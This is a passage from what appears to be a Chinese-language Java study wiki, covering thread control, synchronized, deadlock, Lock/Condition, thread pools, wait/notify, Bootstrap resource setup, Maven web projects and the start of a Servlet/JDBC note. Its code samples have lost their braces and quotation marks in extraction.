解决重点 volatile 保证可见性，适合简单状态标记 synchronized 保证互斥，也建立可见性边界 因此，停止线程更稳妥的做法通常不是强制终止，而是通过共享状态、可见性保证和循环条件配合，让线程自己走到结束位置。 中断协作interrupt() 用于发出中断请求： T t = new T();t.setName(线程1);t.setPriority(10);t.start();for (int i = 0; i 22; i++) Thread.sleep(1000); System.out.println(hi + Thread.currentThread().getName());t.interrupt(); 对应的线程体是： class T extends Thread @Override public void run() for (int i = 0; i 100; i++) System.out.println(Thread.currentThread().getName() + 线程正在运行); try System.out.println(Thread.currentThread().getName() + 线程正在休眠); Thread.sleep(20 * 1000); catch (InterruptedException e) System.out.println(Thread.currentThread().getName() + 线程被中断); Thread.currentThread().interrupt(); 中断处理有两个边界： interrupt() 并不会像强制关闭进程那样直接把线程“砍掉”。 如果线程正好处在 sleep()、wait() 这类阻塞方法里，中断会让它抛出 InterruptedException。 所以很多时候，interrupt() 更像是一种 中断信号。线程要不要停，通常还要结合代码本身的处理逻辑来看。 场景 中断后的常见表现 线程正在普通计算 中断标记被设置，线程自己决定是否结束 线程正在 sleep() 抛出 InterruptedException 线程正在 wait() join() 同样可能抛出 InterruptedException join() 的等待关系join() 用于等待目标线程终止： R r = new R();r.start();for (int i = 1; i = 20; i++) System.out.println(Thread.currentThread().getName() + -hi- + i); Thread.sleep(1000); if (i == 5) r.join(); Thread.sleep(1000); System.out.println(主线程结束); 子线程： class R extends Thread int count = 0; @Override public void run() while (true) try Thread.sleep(1000); System.out.println(Thread.currentThread().getName() + -hello- + (++count)); catch (InterruptedException e) Thread.currentThread().interrupt(); return; if (count == 20) break; join() 的意思不是“把两个线程合成一个线程”，而是：当前线程先暂停向下执行，等目标线程执行完再继续。 同一主题下还有另一段 Runnable 写法： E e = new E();Thread t = new Thread(e);for (int i = 0; i 100; ) System.out.println(hi + (i++)); if (i == 5) t.start(); t.join(); Thread.sleep(1000); 这两段代码放在一起看，会很容易把 join() 的语义读清楚： 线程本来是并发交替执行的。 一旦调用 join()，当前线程就会等待。 等待结束后，再恢复自己的执行。 这也是为什么很多下载、子任务汇总、批处理合并结果的代码里会出现 join()。 守护线程Er er = new Er();Thread thread = new Thread(er);thread.setDaemon(true);thread.start();System.out.println(主线程结束……); class Er implements Runnable int time = 1; @Override public void run() while (true) System.out.println(hello + time++); try Thread.sleep(1000); catch (InterruptedException e) Thread.currentThread().interrupt(); return; if(time == 10) System.out.println(子线程结束……); break; 守护线程最容易误解的点，是把它当成“可有可无的线程”。其实它仍然会正常执行，只是它的生命周期依附于用户线程。 当进程里只剩守护线程时，JVM 会直接退出。 常见例子包括： 垃圾回收线程 后台监控线程 一些日志清理、缓存维护任务 共享可变状态售票任务中的 ticket 是多个线程共同访问的可变状态： class SellTicket implements Runnable private static int ticket = 10; @Override public void run() while (true) if (ticket = 0) System.out.println(票卖完了); break; System.out.println(Thread.currentThread().getName() + 卖出一张票，票号 + --ticket); try Thread.sleep(5000); catch (InterruptedException e) Thread.currentThread().interrupt(); return; 多个线程同时执行时会发生竞态： 多个线程会同时读到同一张票。 ticket-- 不是原子操作。 线程休眠期间，别的线程可能已经改掉共享数据。 这才是线程安全的起点。也就是说，只要多个线程同时操作同一份可变状态，就必须考虑同步。 synchronized 的锁对象同步是否有效取决于多个线程是否使用同一个锁对象保护同一份共享状态。 同步代码块synchronized (this) if (ticket = 0) System.out.println(票卖完了); break; System.out.println(Thread.currentThread().getName() + 卖出一张票，票号 + --ticket); 同步实例方法public synchronized void sell() if (ticket = 0) System.out.println(票卖完了); loop = false; return; System.out.println(Thread.currentThread().getName() + 卖出一张票，票号 + --ticket); 同步静态方法public synchronized static void sell() if (ticket = 0) System.out.println(票卖完了); loop = false; return; System.out.println(Thread.currentThread().getName() + 卖出一张票，票号 + ticket); ticket--; 把这些写法放在一起，就能看清楚锁对象的落点： 写法 锁对象 synchronized(this) 当前实例对象 synchronized(某个共享对象) 显式指定的共享对象 同步实例方法 当前实例对象 this 同步静态方法 当前类的 Class 对象 这也是为什么继承 Thread 时，很多同步代码会写成： synchronized (SellTicket2.class) ... 因为不同线程对象各自是不同实例，如果锁的是 this，那锁住的只是各自的对象，根本保护不了共享票数。 synchronized 的意义也不只是“同一时间只让一个线程进来”。线程退出同步区域时，会把修改过的共享数据刷新出去；其他线程进入同一把锁保护的区域时，也能看到更一致的数据状态。也就是说，它同时在处理互斥和可见性。 同步失效的常见原因看下面这个版本： class SellTicket2 extends Thread private static int ticket = 100; private static boolean loop = true; public synchronized static void sell() if (ticket = 0) System.out.println(票卖完了); loop = false; return; System.out.println(Thread.currentThread().getName() + 卖出一张票，票号 + ticket); ticket--; @Override public void run() while (loop) sell(); try Thread.sleep(50); catch (InterruptedException e) Thread.currentThread().interrupt(); return; 这个版本已经比“完全没加锁”安全很多，但写同步代码时还要继续警惕下面几类问题： 锁对象是不是所有线程都共享 临界区范围是不是过大或过小 共享变量是不是静态或共享实例 线程退出条件是不是也会产生竞态 同步不是只写一个关键字就结束，而是要确认“保护的到底是不是同一份数据”。 死锁以下代码以相反顺序获取 o1 和 o2，可能形成死锁： class ff extends Thread static Object o1 = new Object(); static Object o2 = new Object(); private boolean tr; public ff(boolean tr) this.tr = tr; @Override public void run() if(tr) synchronized (o1) System.out.println(Thread.currentThread().getName() + 线程1); synchronized (o2) System.out.println(Thread.currentThread().getName() + 线程2); else synchronized (o2) System.out.println(Thread.currentThread().getName() + 线程3); synchronized (o1) System.out.println(Thread.currentThread().getName() + 线程4); 两个线程加锁顺序相反： 线程 A：先拿 o1，再等 o2 线程 B：先拿 o2，再等 o1 如果两个线程恰好各自拿到一个锁，就会互相等待，谁也走不下去。 死锁常见触发条件 示例中的对应表现 多个共享锁对象 o1、o2 都是静态共享对象 加锁顺序不一致 一个先锁 o1，一个先锁 o2 相互等待 都在等对方释放第二把锁 同步解决的是并发错误，但同步写得不好，也会制造新的并发问题。 并发边界 sleep()、join()、interrupt()、守护线程，解决的是执行节奏问题。 synchronized 解决的是共享资源的互斥访问问题。 死锁提醒的是：加锁不仅要能防错，还要能走得通。 wait/notify、Lock/Condition 和线程池都建立在共享状态、互斥范围与任务调度这些边界之上。 这里的停止标记只能控制循环主动检查该标记的任务；阻塞在不可中断 IO 或外部调用中的线程，仍需要对应 API 的取消机制。interrupt() 也不是强制终止，捕获 InterruptedException 后通常应恢复中断状态，并让任务尽快结束。","tags":[null,null]},{"title":"Java笔记39-Bootstrap前端资源准备","path":"/wiki/java/java-note-39.html","content":"版本边界： Bootstrap 4 的 JavaScript 依赖 jQuery，部分组件还依赖 Popper；Bootstrap 5 已移除 jQuery 依赖。CSS、脚本和组件写法必须来自同一大版本。 传统 Java Web 应用可以把 Bootstrap 文件部署在应用内部，由 Servlet 容器和 JSP 页面共同提供。资源目录、上下文路径和 Bootstrap 版本决定浏览器最终请求到哪些 CSS 与 JavaScript 文件。 HTML 页面入口最基础的 HTML 页面骨架通常就是下面这样： !DOCTYPE htmlhtml lang=en head meta charset=UTF-8 / titleTitle/title /head body/body/html 页面入口包含 HTML5 文档声明、字符集、标题和正文： 结构 作用 !DOCTYPE html 声明文档是 HTML5 html 页面根节点 head 放元信息、样式引入、页面标题 body 放显示在页面上的内容 meta charset=UTF-8 指定字符集，避免中文乱码 lang 应与页面主要语言一致，例如中文页面使用 zh-CN。 本地静态资源目录本地资源通常按类型分目录： css js CSS 文件放在 css，脚本文件放在 js；图片和字体可以继续使用独立目录。目录位置必须位于容器可公开访问的静态资源范围内，不能放进浏览器不可直接访问的 WEB-INF。 Bootstrap 样式与脚本文件资源目录里可以看到不少文件名： bootstrap.css bootstrap.min.css bootstrap-grid.css bootstrap-reboot.css bootstrap-utilities.css bootstrap.js bootstrap.bundle.js 不同构建文件覆盖的功能范围不同： 文件 作用 bootstrap.css 完整版样式文件，便于阅读 bootstrap.min.css 压缩版样式文件，适合发布环境 bootstrap-grid.css 只保留栅格系统相关样式 bootstrap-reboot.css 浏览器默认样式重置 bootstrap-utilities.css 常用工具类样式 bootstrap.js Bootstrap 脚本功能 bootstrap.bundle.js Bootstrap 脚本与 Popper，不包含 jQuery 同一页面不应同时引入完整 CSS 和它的 grid、reboot 子集，以免重复加载。 bundle 文件的依赖范围 文件 特点 bootstrap.js Bootstrap 组件逻辑，不包含 Popper bootstrap.bundle.js Bootstrap 组件逻辑并包含 Popper 下拉菜单、提示框等依赖 Popper 的组件可以使用 bundle。Bootstrap 4 无论是否使用 bundle，都要另行加载 jQuery；Bootstrap 5 不需要 jQuery。 传统 Java Web 中的本地引入有了本地静态资源后，页面通常会这么写： !DOCTYPE htmlhtml lang=zh-CN head meta charset=UTF-8 / titleBootstrap 页面/title link rel=stylesheet href=./css/bootstrap.min.css / /head body div class=container h1 class=mt-3Hello Bootstrap/h1 button class=btn btn-primary提交/button /div script src=./js/bootstrap.bundle.min.js/script /body/html 页面由服务端渲染并不改变浏览器加载静态资源的方式：HTML 中的 URL 仍会触发独立 HTTP 请求。 静态资源加载故障静态资源一旦没引成功，页面现象往往很明显： 现象 可能原因 页面完全没有样式 CSS 路径写错或文件未加载 按钮、弹窗等组件没反应 JS 文件没加载成功 中文乱码 字符集没有声明或环境编码不一致 部分样式有效、部分无效 引错了局部版 CSS 文件 因此前端资源准备虽然不复杂，但它和“页面能不能正常显示”是直接绑定的。 上下文路径与资源 URL在 Java Web 里，页面路径不是单纯的文件路径，而是浏览器发给服务器的 URL。比如 JSP 页面中写： link rel=stylesheet href=./css/bootstrap.min.css / 浏览器会根据当前页面地址去拼出最终请求路径。当前页面位置一变，./css/... 的含义也可能跟着变。所以传统 Web 项目里经常会更推荐借助上下文路径： link rel=stylesheet href=$pageContext.request.contextPath/css/bootstrap.min.css 上下文路径使资源 URL 与部署名称解耦，应用部署在 /、/brand 或 /shop 时无需修改固定前缀。 Bootstrap 的常见页面组件Bootstrap 提供布局、表单和交互组件： 场景 常见组件 列表展示 表格、分页、徽章 表单录入 输入框、下拉框、按钮、校验提示 页面布局 container、栅格系统、卡片 交互组件 模态框、折叠面板、导航栏 对于传统 Java Web 页面来说，这些几乎都是高频需求。 服务端页面与前端资源的边界Servlet、JSP、Spring MVC 负责的是： 请求怎么过来 数据怎么传到页面 页面提交之后怎么回到后端 浏览器端的布局和交互仍由 HTML、CSS 与 JavaScript 完成。后端职责与前端资源应通过清晰的 URL 和接口边界连接。 静态资源组织要点 开发时可以优先引未压缩版文件，排查问题更直观。 发布时更适合使用 .min.css、.min.js 压缩版。 如果页面只需要布局系统，不一定非得整包全引。 静态资源目录建议从一开始就整理清楚，后面 JSP 页面一多，维护成本会明显不同。 页面里不要把静态资源路径写得过于依赖当前文件位置，后面做转发、重定向或迁移目录时很容易失效。 发布前可以在浏览器开发者工具的 Network 面板确认资源状态码、响应类型和最终 URL，避免只根据页面外观判断加载结果。","tags":[null,null]},{"title":"Java笔记38-Lock与线程池","path":"/wiki/java/java-note-38.html","content":"Lock 提供显式加锁、可中断获取锁和多个条件队列等控制能力；线程池负责复用工作线程并限制任务接收规模。它们分别处理线程协作与任务执行资源管理。 ReentrantLockReentrantLock 与两个 Condition 可以分别管理生产者和消费者的等待队列： class tick implements Runnable private int num = 0; private final Lock l = new ReentrantLock(); Condition producer = l.newCondition(); Condition consumer = l.newCondition(); public void increment() l.lock(); try while (num != 0) producer.await(); num++; System.out.println(Thread.currentThread().getName() + = + num); Thread.sleep(1000); consumer.signal(); catch (InterruptedException e) Thread.currentThread().interrupt(); return; finally l.unlock(); public void decrement() l.lock(); try while (num == 0) consumer.await(); num--; System.out.println(Thread.currentThread().getName() + = + num); Thread.sleep(1000); producer.signal(); catch (InterruptedException e) Thread.currentThread().interrupt(); return; finally l.unlock(); 与单个对象监视器相比，这种写法提供了以下控制能力： 加锁和解锁是显式控制的。 等待队列不再只有一份。 生产者和消费者可以分别使用不同的 Condition。 也就是说，Lock 让“锁”本身可控，Condition 让“等待队列”也可控。 Condition 的多个等待队列按 A - B - C 顺序执行时，可以为每个条件建立独立的等待队列： class tick private int num = 1; Lock lock = new ReentrantLock(); Condition condition1 = lock.newCondition(); Condition condition2 = lock.newCondition(); Condition condition3 = lock.newCondition(); public void A() lock.lock(); try while (num != 1 ) condition1.await(); num = 2; System.out.println(A); condition2.signal(); catch (InterruptedException e) Thread.currentThread().interrupt(); return; finally lock.unlock(); public void B() lock.lock(); try while (num != 2 ) condition2.await(); num = 3; System.out.println(B); condition3.signal(); catch (InterruptedException e) Thread.currentThread().interrupt(); return; finally lock.unlock(); public void C() lock.lock(); try while (num != 3 ) condition3.await(); num = 1; System.out.println(C); condition1.signal(); catch (InterruptedException e) Thread.currentThread().interrupt(); return; finally lock.unlock(); 如果只用一个等待队列，这种“定向叫醒下一个线程”的写法会麻烦很多。Condition 的核心价值就在这里： 工具 等待队列特点 wait() notify() 默认围绕同一把对象锁等待 Condition 一把锁下可以拆出多个等待队列 多个条件队列适合需要定向通知不同线程组的协作场景。 用状态控制交替执行再看一个更直观的线程协作例子： public class Factory private int sign = 0; private Lock l = new ReentrantLock(); Condition producer = l.newCondition(); Condition consumer = l.newCondition(); public void produce(int i) l.lock(); try while (sign == 1) producer.await(); System.out.print(i); this.sign = 1; consumer.signal(); catch (InterruptedException e) Thread.currentThread().interrupt(); return; finally l.unlock(); public void consume(char c) l.lock(); try while (sign == 0) consumer.await(); System.out.print(c); this.sign = 0; producer.signal(); catch (InterruptedException e) Thread.currentThread().interrupt(); return; finally l.unlock(); 配合两个线程： for (int i = 1; i = 26; i++) factory.produce(i);for (int i = a; i = z; i++) factory.consume((char) i); 这类题看起来像“花式打印”，其实训练的是很典型的并发思维： 用 sign 描述当前轮到谁执行 不满足条件就等待 满足条件就执行并切换状态 执行完唤醒对方 线程协作一旦抽象到这一步，从机制上看就已经很像状态机了。 synchronized 与 Lock 对比项 synchronized Lock ReentrantLock 语法形式 Java 关键字 Java 接口及实现类 加锁释放 自动进入、自动释放 手动 lock() unlock() 等待队列 依赖对象监视器 可配合多个 Condition 控制粒度 简单直接 更灵活 风险点 写法简单但扩展性有限 忘记 unlock() 容易出问题 因此并不是 Lock 一定比 synchronized “高级”，而是它更适合复杂协作和更细粒度的控制。 线程池的任务复用与容量控制Executors 提供若干常用线程池工厂方法： // ExecutorService threadPool = Executors.newSingleThreadExecutor();// ExecutorService threadPool = Executors.newFixedThreadPool(50);ExecutorService threadPool = Executors.newFixedThreadPool(8);for (int i = 0; i 100; i++) threadPool.submit(() - System.out.println(Thread.currentThread().getName()); );threadPool.shutdown(); 线程池复用工作线程，并通过线程数量、任务队列和拒绝策略控制任务接收能力。 这样做的意义主要有三点： 降低频繁创建和销毁线程的开销。 控制并发量，避免线程无限膨胀。 统一管理任务队列、线程数量和拒绝策略。 ThreadPoolExecutor 参数ThreadPoolExecutor 可以显式配置线程数、队列和拒绝策略： ThreadPoolExecutor threadPool = new ThreadPoolExecutor(5,8,0,TimeUnit.SECONDS,new ArrayBlockingQueue(5),Executors.defaultThreadFactory(),new ThreadPoolExecutor.AbortPolicy()); 这七个参数几乎就是线程池这一节的主体： 参数 作用 corePoolSize 核心线程数 maximumPoolSize 最大线程数 keepAliveTime 非核心线程空闲存活时间 unit 时间单位 workQueue 阻塞队列 threadFactory 线程工厂 handler 拒绝策略 这些参数共同决定线程池如何接收任务、何时扩容以及容量耗尽后的处理方式。 任务调度边界线程池不是简单地“提前创建几个线程”，而是把任务接收、线程复用、排队等待、扩容和拒绝都放进一个统一模型里。 从任务进入线程池开始，可以按这条线理解： 提交任务 ↓核心线程是否空闲 ↓进入任务队列 ↓是否扩容到最大线程数 ↓是否触发拒绝策略 线程数量只是容量模型的一部分，队列和拒绝策略同样决定系统过载时的行为。 execute() 和 submit() 也可以顺手分清： 方法 特点 execute() 提交任务，不直接返回结果 submit() 提交任务，并返回 Future 需要获取执行结果、观察异常或取消任务时，可以保存 submit() 返回的 Future。 拒绝策略ThreadPoolExecutor 内置四种常见拒绝策略： // new ThreadPoolExecutor.AbortPolicy()// new ThreadPoolExecutor.CallerRunsPolicy()new ThreadPoolExecutor.DiscardPolicy()// new ThreadPoolExecutor.DiscardOldestPolicy() 它们的差别最好直接对照着看： 拒绝策略 行为 AbortPolicy 直接抛异常 CallerRunsPolicy 交给调用者线程自己执行 DiscardPolicy 直接丢弃任务 DiscardOldestPolicy 丢弃队列里最老的任务，再尝试接收新任务 拒绝策略决定线程数和队列容量都耗尽后的行为。静默丢弃任务可能造成数据缺失，采用前应明确业务后果。 线程池容量变化以这段配置为例： new ThreadPoolExecutor(5, 8, 0, TimeUnit.SECONDS,new ArrayBlockingQueue(5),Executors.defaultThreadFactory(),new ThreadPoolExecutor.DiscardPolicy()) 可以顺着这个顺序理解任务进入线程池时会发生什么： 先用核心线程处理，直到 5 个核心线程都忙起来。 新任务继续进入阻塞队列，最多排 5 个。 队列满了之后，再扩容到最多 8 个线程。 还放不下时，才触发拒绝策略。 这套顺序为任务接收建立了明确的容量边界。 运行细节用 while 复查等待条件等待条件必须使用 while 复查： while (num != 0) producer.await(); 线程可能出现虚假唤醒，状态也可能在重新获取锁之前被其他线程改变。 关闭线程池不再接收新任务时，应关闭线程池： threadPool.shutdown(); 否则线程资源可能会一直占着不释放。 如果需要更强硬地尝试中断正在执行的任务，还会看到 shutdownNow()。不过这类写法会影响正在运行的任务，通常需要结合业务场景谨慎处理。 使用边界使用 Lock 时应把 unlock() 放入 finally，等待条件使用 while 复查，并在中断异常中恢复中断状态。使用线程池时还要明确队列容量、拒绝策略、任务异常处理和关闭时机；一个默认可用的线程池工厂并不能替代这些工程决策。","tags":[null,null]},{"title":"Java笔记37-wait与notify","path":"/wiki/java/java-note-37.html","content":"wait() 和 notify() 依托对象监视器，让多个线程围绕同一份共享状态协作。等待条件、状态修改和通知操作必须由同一个锁保护。 共享对象与状态包子铺案例里，共享对象非常简单： public class Baozi String Xianer; boolean statu = false; 这个类只有两个字段，但信息量很大： 字段 含义 Xianer 当前包子的馅料信息 statu 包子当前有没有做好 也就是说，顾客线程和商家线程并不是凭空通信，而是都围绕这一个 Baozi 对象在读写状态。 如果没有这份共享状态，线程之间就谈不上“通信”，只能算各跑各的。 对象监视器wait()、notify() 属于 Object，这不是偶然。Java 中每个对象都可以作为一把监视器锁，线程进入 synchronized (baoZi) 时，拿到的就是 baoZi 这个对象的监视器。 调用 wait() 时，线程会做两件事： 释放当前持有的监视器锁。 进入这个对象对应的等待队列。 被 notify() 唤醒以后，线程也不是马上继续执行，而是先回到锁竞争中。重新拿到同一把锁以后，才会从 wait() 后面继续往下走。 锁对象与等待对象必须一致顾客线程在包子尚未准备好时等待： public class Guke extends Thread Baozi baoZi; public Guke(Baozi baoZi) this.baoZi = baoZi; int count = 0; public void run () synchronized (baoZi) while (true) while (!baoZi.statu) try baoZi.wait(); catch (InterruptedException e) throw new RuntimeException(e); if (count % 2 == 0) baoZi.Xianer = 猪肉葱花; else baoZi.Xianer = 韭菜鸡蛋; count++; System.out.println(顾客开始吃 + baoZi.Xianer + 馅的包子); Thread.sleep(3000); baoZi.statu = false; System.out.println(顾客吃完了，商家开始做); baoZi.notify(); 再看商家线程： public class Shangjia extends Thread Baozi baoZi; public Shangjia(Baozi baoZi) this.baoZi = baoZi; public void run() while(true) synchronized (baoZi) while (baoZi.statu) try baoZi.wait(); catch (InterruptedException e) e.printStackTrace(); System.out.println(商家开始做包子); Thread.sleep(3000); baoZi.statu = true; System.out.println(包子做好了，请顾客趁热吃); baoZi.notify(); 这两段代码关键的共同点有两个： 都写在 synchronized (baoZi) 代码块里。 调用的都是 baoZi.wait() 和 baoZi.notify()。 这不是形式要求，而是语义要求。因为线程等待和唤醒的对象，必须和当前持有的锁对象是同一个。 如果锁的是 baoZi，却去调用别的对象的 wait()，程序就会出错。 生产者与消费者的状态切换把商家和顾客的代码连起来看，从机制上看是在围绕 statu 这个字段切换： statu 值 含义 哪个线程该继续运行 false 还没有包子 商家应该继续做 true 包子已经做好 顾客应该继续吃 线程通信的关键不在“谁比较重要”，而在 状态有没有满足对方继续执行的条件。 这也是为什么 wait() notify() 经常和“生产者消费者模型”一起讲： 生产者负责把资源准备好 消费者负责把资源拿走 双方通过共享状态和等待唤醒机制协作 wait() 与 sleep()这两个方法经常被初学者混在一起，需要专门分开： 对比项 wait() sleep() 所属类 Object Thread 使用位置 必须在同步区域中 任意位置都能调用 是否释放锁 会释放当前持有的锁 不会释放锁 唤醒方式 依赖 notify() notifyAll() 或超时 时间到了自动恢复 也就是说，sleep() 更像“我先歇一会儿”，而 wait() 更像“条件没满足，我先把锁让出来，等别人通知我再继续”。 这正是线程通信和普通线程暂停之间的本质差别。 notify() 的唤醒语义例如商家线程执行了： baoZi.statu = true;System.out.println(包子做好了，请顾客趁热吃);baoZi.notify(); 它并不意味着顾客线程会立刻无缝接着跑。准确来说： 商家线程通知等待中的顾客线程。 顾客线程从等待队列中被唤醒。 顾客线程还要重新竞争 baoZi 这把锁。 拿到锁以后，才会继续执行。 所以 notify() 的语义更接近“可以准备继续了”，而不是“执行权已经被强行交出”。 用 while 复查等待条件等待条件应使用 while 循环检查： while (!baoZi.statu) baoZi.wait(); 线程被唤醒后不代表条件已经满足，因此获取锁后还要重新读取共享状态。 这通常和下面两个问题有关： 虚假唤醒 多线程竞争下状态已经被别的线程改掉 if 只检查一次，while 会在每次从等待状态恢复后重新检查。 notify() 与 notifyAll()当生产者和消费者各只有一个线程时，notify() 可以完成交替通知。线程数量增加或存在多种等待条件时，notify() 可能唤醒不满足条件的线程；此时通常结合条件循环使用 notifyAll()，或改用多个 Condition、阻塞队列等更明确的协作工具。 但如果线程数量增多，就要开始关心唤醒范围： 方法 含义 notify() 唤醒一个等待中的线程 notifyAll() 唤醒所有等待中的线程 线程数量越多、等待条件越复杂，就越要谨慎对待只唤醒一个线程的写法。 协作边界这个生产者与消费者示例包含线程通信的主要组成： 先有共享对象 再有共享状态 再用同步保证互斥 最后用 wait() notify() 让线程围绕状态切换 示例中的 Thread.sleep() 位于同步区域内，休眠期间不会释放监视器，会延长其他线程等待锁的时间。工程代码应尽量缩小临界区，并优先考虑 BlockingQueue 等已经封装等待、唤醒和可见性规则的并发容器。 此外，wait() 只释放调用对象的监视器，不会释放线程持有的其他锁；notify() 也不会立即转移执行权。条件判断、状态修改和唤醒调用应围绕同一个锁组织，并在唤醒后重新检查条件。","tags":[null,null]},{"title":"Java笔记41-MavenWeb工程","path":"/wiki/java/java-note-41.html","content":"Maven 管理工程目录、依赖解析、类路径资源、测试和打包。接入 MyBatis、Servlet、日志与测试框架后，这些构建问题会集中体现在 pom.xml 中。 pom.xml 的工程信息最基础的项目信息通常都写在 pom.xml 里： modelVersion4.0.0/modelVersiongroupIdjava.com/groupIdartifactIdMavenDemo/artifactIdpackagingwar/packagingversion1.0-SNAPSHOT/versionnameMavenDemo Maven Webapp/name 这些字段共同描述构件身份和打包类型： 标签 作用 groupId 项目所属组织或公司标识 artifactId 当前模块或项目名称 version 当前版本 packaging 打包方式，如 jar、war 这里的 packaging 是 war，这就说明整个工程是按 Web 应用来组织的，而不是普通的命令行 Java 程序。 Maven 坐标groupId、artifactId、version 合在一起，才构成一个依赖坐标。Maven 仓库里不是按文件名随便找 jar，而是按这三个信息定位构件。 groupId - 组织或包域名artifactId - 项目或模块名version - 具体版本 不同版本对应不同坐标。Maven 根据坐标解析直接依赖和传递依赖，并构造项目的依赖树。 标准目录与类路径传统 Maven Web 工程通常包含以下目录： 目录 用途 src/main/java 放正式 Java 源码 src/main/resources 放配置文件、映射文件等类路径资源 src/main/webapp 放 JSP、静态资源、WEB-INF src/test/java 放测试代码 target 构建输出目录 例如，Java 类、类路径资源、Web 资源和测试分别位于对应目录： Brand.java、MyBatisUtil.java 放在 src/main/java mybatis.xml、mapper/BrandMapper.xml 放在 src/main/resources index.jsp、WEB-INF/web.xml 放在 src/main/webapp MybatisTest.java 放在 src/test/java src/main/resources 的内容会复制到运行时类路径，因此可以按资源名读取： String resource = mybatis.xml;InputStream inputStream = Resources.getResourceAsStream(resource); 原因就在于 mybatis.xml 被放进了 src/main/resources，构建后会自动进入类路径。 依赖管理只看这一段依赖，就已经能看出工程的技术栈了： dependency groupIdorg.mybatis/groupId artifactIdmybatis/artifactId version3.5.5/version/dependencydependency groupIdmysql/groupId artifactIdmysql-connector-java/artifactId version8.0.31/version/dependencydependency groupIdjavax.servlet/groupId artifactIdjavax.servlet-api/artifactId version3.1.0/version scopeprovided/scope/dependency 从这几段依赖就能直接读出： 用 mybatis 做持久层 用 mysql-connector-java 连接 MySQL 用 javax.servlet-api 支撑 Web 层 scope 控制依赖参与哪些构建阶段： 依赖范围 含义 默认 compile 编译、测试、运行都参与 test 只在测试阶段可用 provided 编译时需要，但运行时由外部容器提供 servlet-api 通常使用 provided，因为外部 Tomcat 等容器在运行时提供 Servlet API。若使用嵌入式容器，依赖组织方式由对应框架插件和打包方式决定。 构建生命周期Maven 常见命令背后是一条生命周期： 阶段 作用 compile 编译正式源码 test 执行测试 package 打包成 jar 或 war install 安装到本地仓库 这意味着执行靠后的阶段时，前面的阶段通常也会被带着执行。例如执行 package，通常会先完成编译和测试，再生成最终包。 从 pom.xml 识别工程能力继续往下看依赖，会发现这份配置已经远不只是“跑一个 Java 程序”： dependency groupIdjstl/groupId artifactIdjstl/artifactId version1.2/version/dependencydependency groupIdorg.projectlombok/groupId artifactIdlombok/artifactId version1.18.20/version/dependencydependency groupIdjunit/groupId artifactIdjunit/artifactId version4.12/version scopetest/scope/dependency 这说明工程已经同时考虑到了： JSP 页面标签库 实体类简化 单元测试 数据库访问 Web 容器部署 这些依赖分别提供标签库、代码生成、测试、数据库访问和 Servlet API；Maven 同时负责它们的作用域与版本解析。 resources 与类路径资源类路径配置应放在 src/main/resources，Web 根目录资源应放在 src/main/webapp。 MyBatis 配置文件本身就说明了 resources 目录的重要性： configuration settings setting name=mapUnderscoreToCamelCase value=true/ /settings typeAliases package name=com.java.pojo/ /typeAliases mappers mapper resource=mapper/BrandMapper.xml/ /mappers/configuration 这里涉及两层资源： mybatis.xml 自己作为类路径资源被加载 mybatis.xml 再继续去加载 mapper/BrandMapper.xml 如果这些文件不在 resources 下，就很容易出现“运行时找不到配置”的问题。 测试代码目录测试代码放在 src/test/java 下： SqlSession sqlSession = MyBatisUtil.getSqlSession();Brand brand = sqlSession.selectOne(brand.selectById, 1);System.out.println(brand); 把测试放在单独目录的好处很实际： 不会混进正式打包产物 测试依赖只在测试阶段参与 代码职责更清楚 JUnit 通常使用 test 作用域，避免进入主程序的运行时依赖。 target 构建产物Maven 构建后，target 目录里已经可以看到这些内容： classes test-classes 打包后的资源 这说明 Maven 做的不只是下载依赖，还包括： 编译源码 复制资源文件 区分正式类和测试类 准备最终可打包内容 例如 src/main/resources/mapper/BrandMapper.xml 最终会出现在： target/classes/mapper/BrandMapper.xml 运行时从 target/classes 读取这些资源，因此资源路径相对于 src/main/resources 根目录书写。 传统 Web 工程的 web.xmlsrc/main/webapp/WEB-INF/web.xml 在这类工程里依然很常见： !DOCTYPE web-app PUBLIC-//Sun Microsystems, Inc.//DTD Web Application 2.3//ENhttp://java.sun.com/dtd/web-app_2_3.dtd web-app display-nameArchetype Created Web Application/display-name/web-app web.xml 描述 Servlet、Filter、Listener 等 Web 组件。Servlet 3.0+ 可以使用注解或程序化配置替代其中一部分声明，但是否需要部署描述符取决于应用和容器版本。 Spring MVC 与 Spring Boot 的工程组织方式有所变化，但 webapp、WEB-INF 和 war 仍是理解传统容器部署结构的基础。 工程配置习惯例如这份依赖里同时出现了： junit 4.12 junit 4.11 日志相关依赖也同时出现了多种实现。 同一依赖出现多个版本或同时引入多套日志实现时，需要检查最终依赖树。 做项目时，通常还要继续关注： 是否有重复依赖 是否存在版本冲突 是否混用了多套日志实现 依赖范围是否写得准确 传递依赖是否引入了不需要的包 可以使用 mvn dependency:tree 查看版本仲裁和传递依赖，并通过 dependencyManagement 统一多模块版本。 构建边界 引入框架坐标靠 pom.xml 配置文件进入类路径靠标准目录 Web 项目部署靠 war 结构 测试类与正式类分离靠标准目录约定 构建插件版本、编译目标版本和依赖版本同样属于可复现构建的一部分，应在 pom.xml 或父 POM 中显式管理。","tags":[null,null]},{"title":"Java笔记40-Servlet与JDBC小项目","path":"/wiki/java/java-note-40.html","content":"版本边界： 使用 javax.servlet.* 的应用对应 Java EE 8 或更早的命名空间；Jakarta EE 9+ 使用 jakarta.servlet.*。Servlet API、JSP API 与容器版本必须配套。 页面提交请求后，Servlet 接收参数，Service 组织业务，DAO 通过 JDBC 执行 SQL，结果再返回 JSP 页面。 Servlet、JDBC 与 JSP 的请求链如果把品牌管理、登录注册、分页、过滤器这些内容放到一起看，会发现这类系统其实正好把 Java Web 早期主要的知识拼到了一起： 层次 主要职责 JSP 展示页面、提交表单 Servlet 接收请求、分发动作、决定转发还是重定向 Service 组织业务逻辑 DAO 执行 SQL、封装结果 数据库 存储数据 JDBC 负责数据库访问，Servlet 与 JSP 分别承担请求入口和页面呈现；Service 与 DAO 用于分隔业务逻辑和持久化逻辑。 从 HTTP 请求到数据库从运行时角度看，一次请求并不是直接“调用 DAO”。它会先进入 Servlet 容器，再由 Servlet 解析参数，随后才进入业务层和数据层。 浏览器请求 ↓Tomcat / Servlet 容器 ↓Servlet ↓Service ↓DAO ↓JDBC Connection ↓数据库 这条链路很重要，因为每一层负责的错误类型都不一样。请求参数错误通常在 Servlet 层暴露，业务规则错误通常在 Service 层处理，SQL 和连接错误则集中在 DAO 层。 JDBC 连接工具连接工具类会先把配置文件和连接创建统一收拢： static try ClassLoader classLoader = JDBCUtil.class.getClassLoader(); try (InputStream inputStream = classLoader.getResourceAsStream(db.properties)) if (inputStream == null) throw new FileNotFoundException(db.properties); Properties prop 